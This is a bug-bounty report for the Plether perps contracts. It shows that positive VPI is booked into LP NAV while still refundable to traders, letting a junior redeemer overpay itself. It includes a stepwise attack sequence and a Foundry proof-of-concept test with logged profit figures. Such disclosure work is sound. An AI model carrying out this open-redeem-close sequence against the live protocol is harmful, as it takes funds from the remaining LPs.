# \#98919 [SC-Critical] LP NAV omits VPI liabilities of both signs: #97682 covered the reserved negative-VPI clawback; this report covers the trader-refundable positive VPI, which overpays junior redeemers at the expense of the LPs who stay

**Submitted on Nov 10th 2026 at 22:29:42 UTC by @RUNSUN for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98919
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description



**Target**: `packages/perps/src` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (`libraries/HousePoolAccountingLib.sol`, `CfdEngineSettlementSidecar.sol`, `libraries/CloseAccountingLib.sol`, `HousePool.sol`, `libraries/CfdEnginePlanLib.sol`, `TerminalNavBookV2.sol`)

## Brief/Intro

**LP entry and exit are priced from one snapshot, and it has no VPI term in either direction.**
`HousePool.settleLpEpoch` -> `_reconcile` -> `HousePoolAccountingLib.buildReconcileSnapshot` (`L60-L78`) uses only physical assets, trader claims and the terminal price delta. `TerminalNavBookV2` reads each position but discards `vpiAccrued` (`TerminalNavBookV2.sol:L422`).

That leaves two omissions, one per sign of lifetime VPI:
- **negative** lifetime VPI: a clawback the trader owes the pool, held in a reserve outside pool custody. That side is report **#97682**;
- **positive** lifetime VPI (this report): VPI the trader paid at open, which the code books as LP revenue at once, so it **is inside NAV** as `physicalAssets`. Yet the same code refunds it to the trader on a close at unchanged skew.

So at every epoch boundary the pool prices its LPs as if outstanding positive VPI were final income. A junior LP redeeming in that epoch is overpaid by its share of that VPI, and the refund is later paid by the LPs who stay. A trader who is also a junior LP can create the VPI just before the boundary and take it back just after, permissionlessly and in about a minute.

## Vulnerability Details

**1. Open: positive VPI is booked as LP revenue at once** (`CfdEngineSettlementSidecar.sol:L453-L463`):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```
The same amount is recorded on the position: `vpiAccrued += delta` (`Sidecar L517` -> `CfdEngine.sol:L1269`).

**2. Close: the same VPI comes back to the trader.** VPI is path-independent (`cost = k * skew^2 / (2 * depth)`), so closing the same size at unchanged skew gives `vpiDelta <= -P`, where P is the position's accrued VPI. The lifetime clamp turns that into a refund of exactly the accrued amount (`CloseAccountingLib.sol:L114-L117`):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```
It becomes an action rebate (`CfdEnginePlanLib.sol:L1059-L1060`), funded from free pool cash (`L973-L977`) and paid by `pool.payOut` (`CfdEngineSettlementSidecar.sol:L620-L623`).

**3. Pricing: the refundable amount is not in the snapshot** (`HousePoolAccountingLib.sol:L60-L78`):

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
// no term for the refundable positive vpiAccrued of open positions
```
`HousePoolInputSnapshot` (`HousePoolEngineViewTypes.sol:L25-L36`) has no VPI field, and junior redemptions are priced from it (`HousePool.sol:L836-L838`).

**Attack sequence (every step permissionless):**
1. A holds junior shares and calls `requestRedeem` for them before the cutoff (b - 300 s).
2. Just after the epoch boundary b, A, acting as a trader, opens a skew-adding position X. Its VPI V is booked as junior revenue.
3. Anyone calls `settleLpEpoch`. A's redemption is priced on a NAV that includes V.
4. A closes X at unchanged skew and receives V back from pool cash.
5. A claims the redemption. The LPs who stay have paid both the overpaid redemption and the refund.

### The whole class: every path that moves VPI, against the LP pricing snapshot

| Path | Where VPI moves | Direction | In the snapshot at the next `settleLpEpoch`? | LP entry/exit mispriced? |
|---|---|---|---|---|
| Open/increase adding skew | Sidecar L453-463 (revenue), L517 (`vpiAccrued`) | pool receives cash; still trader-refundable | cash yes (`physicalAssets`); refund liability **no** | **YES - positive side (this report)** |
| Close/decrease of a positive-accrual position, reducing skew | CloseAccountingLib L116-117 clamp; Sidecar L620-623 `payOut` | pool pays the refund | the liability was never there | **YES - positive side (this report)** |
| Oracle-frozen / FAD-only voluntary close; protection (TP/SL) close | same close path (SECURITY.md L1441; OrderRouter L440-470 -> `executeClose`) | as above | as above | **YES - both sides** |
| Open/increase reducing skew (rebate) | PlanLib L333; Sidecar L442-444; reserve Sidecar L466-477 | pool pays; clawback reserved outside the pool | clawback receivable **no** | **YES - negative side (#97682)** |
| Close of a negative-accrual position; liquidation of one | PlanLib L947-949, L1559-1569; reserve consumed Sidecar L691-693, L801-804 | pool receives the clawback | no, before it happens | **YES - negative side (#97682)** |
| Close adding skew (fresh VPI charge) | CloseAccountingLib L107-110; Sidecar L604-616 | pool receives; final, never refundable | yes | NO |
| Liquidation of a positive-accrual position; close at zero depth; rebate waived for lack of free cash | PlanLib L1559; CloseAccountingLib L106-111; PlanLib L973-977 | positive accrual forfeited / waived | cash yes | NO - these are why the refund is at most `max(vpiAccrued, 0)` |
| Failed / cancelled / expired orders | none (`vpiAccrued` written only at Sidecar L517, L647) | - | - | NO |

**Both mispriced sides meet in one place**, `buildReconcileSnapshot`, and no engine-wide sum of `vpiAccrued` exists today.

## Why this is not the documented design

SECURITY.md says: "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book" (L863). It also says: "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" (L871-872).

The code does the opposite for positive VPI, on the mechanism itself:
- **The positive VPI is not outside the price book.** It is booked as LP revenue the moment it is paid (Sidecar L453-463), so it sits in `physicalAssets` and raises NAV at the next reconcile. The control arm of the PoC shows it: with no attacker, a third party's skew alone raises the redeemer's payout by about 128 USDG.
- **What stays outside is only the liability to refund it**, which the code pays from the same pool (CloseAccountingLib L116-117, Sidecar L620-623).
- **So NAV holds the income without the obligation attached to it.** The quoted lines describe keeping anticipated VPI out of NAV, and here the received VPI is in NAV while its refund is not.
- **The documentation names only the reserve** ("neither anticipated VPI nor its reserve"), which is the negative side. It says nothing about positive VPI cash that is already counted and still refundable.

**Supporting precedent only:** the project confirmed #97682, the same omission with the opposite sign, under the same SECURITY.md text.

## Relation to #97682 and the fix locus

- **Same class, distinct sign, distinct value path, distinct victim moment:**
  - #97682: an omitted receivable underpays depositors at activation;
  - here: an omitted payable overpays redeemers at exit, through the open-revenue path and the close-rebate path.
- **A fix of #97682 alone does not fix this, and in aggregate widens it.**
  - Today the two omissions partly cancel: the net error is `sum(positive) - sum(negative)`.
  - Adding only `sum(max(-vpiAccrued, 0))` as a receivable leaves the full `sum(max(vpiAccrued, 0))` overstatement.
- **One signed fix closes both:** `NAV -= sum(vpiAccrued)` (see Recommendation).
  - If the project's #97682 fix already nets SIGNED VPI, this report is covered by it.
  - At the time of writing no fix is public (no commit, branch or PR touching this in Plether-Fi/plether-core or the contest repository since 2026-10-29).

## Impact Details

- **Remaining LPs lose value to the redeemer**, junior first, senior once junior is exhausted.
- **Release parameters** (`packages/perps/DEPLOYMENT.md` L128-156: vpiFactor 0.01e18, maxSkewRatio 0.4e18, executionFeeBps 4), D = 2.0M USDG:
  - **attacker +287.51 USDG over control**;
  - **remaining junior LP -479.11 USDG**;
  - redemption overpaid by 671.67 USDG, in one cycle.
  - At the optimum (redeemer share r ~ 0.59) the gain is +347.94 USDG, about 2.04 bps of D.
- **Closed form per settled epoch:** attacker gain / D = 8e-4*r + 3.2e-5/r - 3.2e-4, at most about 2.1 bps of D. The LPs who stay lose about 3 bps of D.
- **It repeats every re-entry cycle** (deposit, activation, 1 h cooldown, redeem), and every epoch with staggered accounts. The attacker carries price risk for only seconds to a minute (open -> settle -> close).
- **No attacker is needed for the defect:** at every boundary where positive `vpiAccrued` is outstanding, junior redeemers are overpaid by their share of it.
- **Scale of the amounts, stated plainly:** the figures above are for one cycle at D = 2.0M USDG. The per-cycle value is small in absolute terms (hundreds of USDG); it grows linearly with pool depth and repeats every cycle. The severity follows the impact row rather than a fixed loss figure, and the escalation conditions are stated below.
- **Possible coverage by the #97682 fix:** if the project's fix for #97682 nets SIGNED `vpiAccrued` into the LP pricing snapshot, it also closes this report; if it nets only the negative side, this report stays open and the net error grows (see "Relation to #97682 and the fix locus").

## Severity

- **Claimed: High**, under the "Theft of unclaimed yield" row - the row and level under which the opposite-sign report #97682 was filed and then confirmed by the project. The mechanism and the loss are proven by an executed differential test at the release parameters; the per-cycle amount is small at D = 2.0M (see "Scale of the amounts").
- **Conditions for Critical:**
  - (a) the value moved is LP principal taken by a permissionless actor; the listed impact for that is "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". It applies if the omission is judged by the same yardstick as #97682, which the project confirmed at Critical;
  - (b) pool depth: the extraction scales linearly with D, at about 2 bps of D per settled epoch.

## Known-issues check

- **Not in the committed audits** (`audits/`, 5 PDFs fully extracted; keyword query over the VPI / NAV / redemption / `buildReconcileSnapshot` terms: no match).
- **Not one of the programme's listed known issues**, and not among the Cecuro MED/LOW items named there (MED-22 carry rounding, MED-24/MED-29 LP refund epochs and redemption rounding, MED-16/LOW-57, MED-13, MED-7, MED-30).
- **Closest, and distinct:** #97682 (negative side), discussed above.

## Recommendation

Account for lifetime VPI of both signs in the LP pricing snapshot:
1. **Maintain one engine aggregate `sum(vpiAccrued)`.** Update it where `vpiAccrued` is written (Sidecar L517 / L647 via `CfdEngine.sol:L1269`) and deleted (`L1283`). Net it, **signed**, into `buildReconcileSnapshot`: positive accrual as a liability, negative accrual as the receivable #97682 needs.
   - `max(vpiAccrued, 0)` is an upper bound on the refund (forfeiture on liquidation and zero-depth closes, waiver when free cash is short), so this errs in the LPs' favour.
2. **Alternatively, do not recognise positive VPI as LP revenue until the position closes**: hold it in an impact pool excluded from pool value.

A fix that adds only the negative-side receivable leaves this report's path open.

## Limits of this report

- **The PATCHED arm models the fix** with a pranked `payOut` / `recordClaimantInflow` around settlement. It is not a source change.
- **The refund is contingent:** exact when the close is at unchanged skew and depth (the attack's case), smaller or zero otherwise. The signed-netting fix therefore slightly over-reserves.
- **Grouping:** if the project fixes #97682 by netting signed VPI, a judge may group this report with it. The distinct sign, path and fix consequence are stated above.
- **Not measured:**
  - pool depths beyond the test's D = 2.0M (the extraction scales with D);
  - the effect of Pyth adverse-confidence pricing on the attacker's two trades, which trims the margin slightly.


## Proof of Concept

## Proof of Concept

**File**: `packages/perps/test/perps/poc/PositiveVpiNavRedemption.t.sol` (inherits the repository's own `HousePoolAsyncTestBase`; release risk parameters; no source change).

**Run** (from the repository root):
```
forge test --root packages/perps --match-path test/perps/poc/PositiveVpiNavRedemption.t.sol -vv
```

**Three arms from the same snapshot:**
- **CONTROL:** no open or close.
- **VULNERABLE:** the attack above.
- **PATCHED:** the same attack, with the redemption priced on a NAV that excludes the refundable `max(vpiAccrued, 0)`. Modelled by moving V out of the pool before settlement and back before the close.

**What the test asserts:** the attacker's total delta (LP leg plus trader leg) exceeds CONTROL, and the victim's junior value falls below CONTROL. Both fire in VULNERABLE and are silent in PATCHED.

**Tests:**
- release parameters;
- zero pre-existing skew;
- larger redeemer share;
- the bound where the attacker's own reserve caps the redemption funding.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {console} from "forge-std/console.sol";

/// A skew-adding open's positive VPI is booked as LP revenue at once
/// (CfdEngineSettlementSidecar L453-463) and raises junior NAV at the next reconcile, but the same amount is
/// refundable to the trader on a close at unchanged skew (CloseAccountingLib L114-118 clamp, Sidecar L621-623 payOut).
/// buildReconcileSnapshot (HousePoolAccountingLib L60-78) has no term for that liability, so a junior redeemer
/// that opens X before its epoch is settled and closes X afterwards is overpaid by the remaining LPs.
contract PositiveVpiRedemptionOverpay is HousePoolAsyncTestBase {

    address constant ATTACKER = address(0xA77AC);
    address constant VICTIM = address(0xB0B0B);
    address constant SKEW_TRADER = address(0x7EADE);
    address constant HOLDER = address(0x40D0); // patched-arm escrow for the refundable VPI

    uint256 constant LP_AMOUNT = 1_000_000e6;
    uint256 constant ATTACKER_TRADER_FUNDS = 50_000e6;

    // mode 0 CONTROL (no open/close), 1 VULNERABLE (open X before settle, close after), 2 PATCHED (same attack,
    // redemption priced on a NAV that excludes max(vpiAccrued, 0) of open positions)
    struct Out {
        int256 attackerDelta; // (wallet + clearinghouse) end - start, LP leg + trader leg
        uint256 redeemAssets;
        uint256 victimValue;
        int256 vpiAccrued;
        uint256 rebate;
        uint256 treasuryDelta;
        uint256 sizeX;
        uint256 depth;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Initial release parameters, packages/perps/DEPLOYMENT.md L128-156 (executionFeeBps = 4 is the engine default)
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _toSize(
        uint256 notionalAssets
    ) internal pure returns (uint256) {
        // price 1e8 -> size(18) = notional(6) * 1e12, rounded down to the 1e20 quantum (100 tokens)
        return ((notionalAssets * 1e12) / 1e20) * 1e20;
    }

    function _run(
        uint256 mode,
        uint256 sBps,
        uint256 victimAmount
    ) internal returns (Out memory o) {
        _fundJunior(ATTACKER, LP_AMOUNT);
        _fundJunior(VICTIM, victimAmount);

        uint256 depth = pool.totalAssets();
        o.depth = depth;
        uint256 sNotional = (depth * sBps) / 10_000;
        if (sNotional > 0) {
            _fundTrader(SKEW_TRADER, sNotional / 10);
            _open(SKEW_TRADER, CfdTypes.Side.LONG, _toSize(sNotional), sNotional / 20, 1e8);
        }
        // X as large as admission allows: S + X <= 0.4 * net depth (one quantum of slack)
        uint256 xNotional = (depth * 4000) / 10_000 - sNotional - 200e6;
        o.sizeX = _toSize(xNotional);

        _fundTrader(ATTACKER, ATTACKER_TRADER_FUNDS); // same funding in every arm
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 start = clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER) + LP_AMOUNT;
        address treasury = engine.protocolTreasury();
        uint256 treasuryStart = clearinghouse.balanceAssets(treasury);

        uint256 shares = juniorVault.balanceOf(ATTACKER);
        uint256 requestId = _requestAsyncRedeem(juniorVault, ATTACKER, shares);

        // boundary b: epoch matures, keeper/router mark refresh
        vm.warp(pool.lpEpochStart(requestId));
        _refreshMarkForAsyncSettlement();

        if (mode != 0) {
            _open(ATTACKER, CfdTypes.Side.LONG, o.sizeX, 20_000e6, 1e8);
            (,,,,,, o.vpiAccrued) = engine.positions(ATTACKER);
        }
        if (mode == 2 && o.vpiAccrued > 0) {
            // PATCHED model: the refundable max(vpiAccrued, 0) is held outside LP NAV while the epoch is priced
            vm.prank(address(engine));
            pool.payOut(HOLDER, uint256(o.vpiAccrued));
        }

        IHousePool.LpEpochSettlementResult memory res = _settleLpEpochForTest();
        assertGt(res.juniorFundedShares, 0, "junior redemption funded");

        if (mode == 2 && o.vpiAccrued > 0) {
            vm.prank(HOLDER);
            settlementToken.transfer(address(pool), uint256(o.vpiAccrued));
            vm.prank(address(engine));
            pool.recordClaimantInflow(
                uint256(o.vpiAccrued), IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
            );
        }

        if (mode != 0) {
            uint256 chBefore = clearinghouse.balanceAssets(ATTACKER);
            _close(ATTACKER, CfdTypes.Side.LONG, o.sizeX, 1e8);
            (uint256 sz,,,,,,) = engine.positions(ATTACKER);
            assertEq(sz, 0, "X closed");
            o.rebate = clearinghouse.balanceAssets(ATTACKER) - chBefore; // includes released margin
        }

        (, o.redeemAssets) = _claimAsyncRedeem(juniorVault, requestId, ATTACKER);
        uint256 end = clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER);
        o.attackerDelta = int256(end) - int256(start);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        o.treasuryDelta = clearinghouse.balanceAssets(treasury) - treasuryStart;

        console.log("mode", mode);
        console.log("  depth D", o.depth);
        console.log("  X notional", o.sizeX / 1e12);
        console.log("  vpiAccrued V", uint256(o.vpiAccrued > 0 ? o.vpiAccrued : int256(0)));
        console.log("  redeem assets", o.redeemAssets);
        console.log("  attacker delta (abs)", uint256(o.attackerDelta >= 0 ? o.attackerDelta : -o.attackerDelta));
        console.log("  attacker delta negative?", o.attackerDelta < 0);
        console.log("  victim value", o.victimValue);
        console.log("  treasury delta (fees)", o.treasuryDelta);
    }

    function _snapshotRun(
        uint256 mode,
        uint256 sBps,
        uint256 victimAmount
    ) internal returns (Out memory o) {
        uint256 id = vm.snapshotState();
        o = _run(mode, sBps, victimAmount);
        vm.revertToState(id);
    }

    function _differential(
        uint256 sBps,
        uint256 victimAmount
    ) internal returns (Out memory c, Out memory v, Out memory p) {
        c = _snapshotRun(0, sBps, victimAmount);
        v = _snapshotRun(1, sBps, victimAmount);
        p = _snapshotRun(2, sBps, victimAmount);

        int256 profitV = v.attackerDelta - c.attackerDelta;
        int256 profitP = p.attackerDelta - c.attackerDelta;
        console.log("=== DIFFERENTIAL (vs control) ===");
        console.log("vuln: attacker excess profit", uint256(profitV > 0 ? profitV : int256(0)));
        console.log("vuln: victim loss", c.victimValue > v.victimValue ? c.victimValue - v.victimValue : 0);
        console.log("vuln: redeem overpayment", v.redeemAssets > c.redeemAssets ? v.redeemAssets - c.redeemAssets : 0);
        console.log("vuln: redemption fully funded?", v.redeemAssets >= c.redeemAssets);
        console.log("patched: attacker excess profit > 0?", profitP > 0);
        console.log("patched: attacker excess loss", uint256(profitP < 0 ? -profitP : int256(0)));
        console.log(
            "patched: victim gain vs control", p.victimValue > c.victimValue ? p.victimValue - c.victimValue : 0
        );
    }

    /// Main test: S = 0.16 D, X fills to the 0.4 D skew cap, attacker = 50% of junior, prod params.
    function test_vulnerable_redeemerOverpaid_releaseParams() public {
        (Out memory c, Out memory v, Out memory p) = _differential(1600, LP_AMOUNT);

        // VULNERABLE arm: harm fires
        assertGt(v.attackerDelta, c.attackerDelta, "VULN: attacker profits vs control");
        assertLt(v.victimValue, c.victimValue, "VULN: victim junior value below control");
        // PATCHED arm: the same assertions do not fire
        assertLe(p.attackerDelta, c.attackerDelta, "PATCHED: attacker cannot profit vs control");
        assertGe(p.victimValue, c.victimValue, "PATCHED: victim not harmed");
    }

    /// Variation: no pre-existing skew (S = 0, X = 0.4 D).
    function test_variation_zeroPreExistingSkew() public {
        (Out memory c, Out memory v, Out memory p) = _differential(0, LP_AMOUNT);
        assertGt(v.attackerDelta, c.attackerDelta, "VULN: attacker profits vs control (S=0)");
        assertLe(p.attackerDelta, c.attackerDelta, "PATCHED: silent (S=0)");
    }

    /// Variation: attacker ~= 58.8% of junior (largest r the free-cash gate funds with S + X = 0.4 D reserved),
    /// S near optimum 0.08 D / r = 0.136 D.
    function test_variation_largerRedeemerShare() public {
        (Out memory c, Out memory v, Out memory p) = _differential(1360, 700_000e6);
        assertEq(v.redeemAssets >= c.redeemAssets, true, "fully funded");
        assertGt(v.attackerDelta, c.attackerDelta, "VULN: attacker profits vs control (r~0.59)");
        assertLe(p.attackerDelta, c.attackerDelta, "PATCHED: silent (r~0.59)");
    }

    /// Variation: attacker 80% of junior -> the open's own liability reserve caps the redemption funding
    /// (free cash = D - L - buffer); documents the r bound. Asserts the partial-funding outcome.
    function test_bound_redemptionCappedByOwnReserve() public {
        (Out memory c, Out memory v,) = _differential(1000, 250_000e6);
        assertLt(v.redeemAssets, c.redeemAssets, "X reserve caps junior redemption funding");
    }
}
```

**Output** (main test logs; amounts in USDG atoms, 6 decimals):
```
Ran 4 tests for test/perps/poc/PositiveVpiNavRedemption.t.sol:PositiveVpiRedemptionOverpay
[PASS] test_bound_redemptionCappedByOwnReserve() (gas: 11398422)
[PASS] test_variation_largerRedeemerShare() (gas: 11418358)
[PASS] test_variation_zeroPreExistingSkew() (gas: 9066175)
[PASS] test_vulnerable_redeemerOverpaid_releaseParams() (gas: 11453376)

[PASS] test_vulnerable_redeemerOverpaid_releaseParams() (gas: 11453376)
Logs:
  mode 0
    depth D 2002000000000
    X notional 480200000000
    vpiAccrued V 0
    redeem assets 1000128034289
    attacker delta (abs) 128034289
    attacker delta negative? false
    victim value 1000128043413
    treasury delta (fees) 0
  mode 1
    depth D 2002000000000
    X notional 480200000000
    vpiAccrued V 1344004213
    redeem assets 1000799700562
    attacker delta (abs) 415540562
    attacker delta negative? false
    victim value 999648936243
    treasury delta (fees) 192080000
  mode 2
    depth D 2002000000000
    X notional 480200000000
    vpiAccrued V 1344004213
    redeem assets 1000128034289
    attacker delta (abs) 256125711
    attacker delta negative? true
    victim value 1000319931527
    treasury delta (fees) 192080000
  === DIFFERENTIAL (vs control) ===
  vuln: attacker excess profit 287506273
  vuln: victim loss 479107170
  vuln: redeem overpayment 671666273
  vuln: redemption fully funded? true
  patched: attacker excess profit > 0? false
  patched: attacker excess loss 384160000
  patched: victim gain vs control 191888114

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 25.69ms (63.30ms CPU time)

Ran 1 test suite in 26.92ms (25.69ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```


